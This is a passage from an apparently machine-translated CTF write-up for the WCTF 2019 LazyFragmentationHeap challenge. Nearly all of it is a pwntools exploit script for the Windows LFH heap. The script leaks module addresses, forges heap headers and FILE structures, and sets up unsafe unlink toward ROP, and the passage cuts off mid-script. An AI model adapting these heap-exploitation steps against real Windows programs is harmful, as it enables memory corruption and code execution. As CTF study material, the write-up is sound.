	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

	<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
		<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
		<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
		<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

	<span class="k">if</span> <span class="n">disconn</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="n">lazy_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">leakLazy</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LazyFragmentationHeap = 0x%016x"</span> <span class="o">%</span> <span class="n">lazy_base</span><span class="p">)</span>

<span class="n">kernel32</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3008</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e690</span>  <span class="c1"># KERNEL32!IsDebuggerPresentStub
</span><span class="n">ntdll</span>    <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3010</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x73810</span>  <span class="c1"># ntdll!RtlInitializeSListHead
</span><span class="n">ucrtbase</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x30b0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x0f760</span>  <span class="c1"># ucrtbase!free
</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"kernel32 = 0x%016x"</span> <span class="o">%</span> <span class="n">kernel32</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll    = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ucrtbase = 0x%016x"</span> <span class="o">%</span> <span class="n">ucrtbase</span><span class="p">)</span>

<span class="s">'''
[*] LazyFragmentationHeap = 0x00007ff76f400000
[*] kernel32 = 0x00007ffd09140000
[*] ntdll    = 0x00007ffd09b00000
[*] ucrtbase = 0x00007ffd075e0000
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now that we have leaked all the necessary module addresses, only the final exploit step remains.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The attack technique is </font></font><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#310-allocate-and-free-non-lfh-chunk"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.10. </font><font style="vertical-align: inherit;">As mentioned in Allocate and Free Non-LFH chunk,</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 R/W primitive must be created using Unsafe Unlink technique and ROP 
must be performed. Since the subsequent part is closer to general Heap 
Feng-Shui than LFH, the explanation will be omitted as a comment in the 
code. .</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">But there are a lot of fun things about this, so I recommend you try this part yourself!</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">9</span><span class="p">:]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">go_back</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">go_back</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">persistent_leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">disconn</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">leakLazy</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
    <span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
    <span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
    <span class="s">'''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''</span>

    <span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>             <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>             <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>    <span class="p">)</span> 
    <span class="n">open_file</span><span class="p">()</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
    <span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x27b2</span> <span class="c1"># can't leak null-byte
</span>    <span class="k">elif</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>        <span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
        
    <span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
    <span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
        <span class="n">open_file</span><span class="p">()</span>

    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
    <span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>                
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
        <span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

    <span class="k">if</span> <span class="n">disconn</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
        <span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
    <span class="k">return</span> <span class="n">result</span>


<span class="n">magic_switch</span> <span class="o">=</span> <span class="bp">True</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
    <span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
    <span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
    <span class="s">'''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># big chunk for LFH's new UserBlock
</span>
    <span class="c1"># pre-setting for Unsafe Unlink
</span>    <span class="c1"># (0x1c80 - 0x40 - 0x200 - 0x1000)/2 = 0x520
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span> 

    <span class="c1"># this is chunk 6
</span>    <span class="c1"># set chunk_id to _HEP_ENTRY for Heap Feng-Shui
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>

    <span class="n">open_file</span><span class="p">()</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4, 5, 6
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4, 5, 6
</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
    <span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
        <span class="n">open_file</span><span class="p">()</span>

    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>    <span class="c1"># +0x000 SubSegment
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>   <span class="c1"># +0x008 Reserved
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                   <span class="c1"># +0x010 SizeIndexAndPadding
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>            <span class="c1"># +0x014 Signature
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                 <span class="c1"># I couldn't leak other values
</span>
    <span class="c1"># cursor points heap_mem of chunk 3
</span>    <span class="n">cursor</span> <span class="o">=</span> <span class="mh">0xbeefdad0000</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span>

    <span class="c1"># HAVE TO set specific values to get input from STDIN
</span>    <span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR &lt;--|
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># base address &lt;--------|-- both must be equal
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                  <span class="c1"># remaining file size
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>                <span class="c1"># &lt;------------------------ only 0 or 1 or 2
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
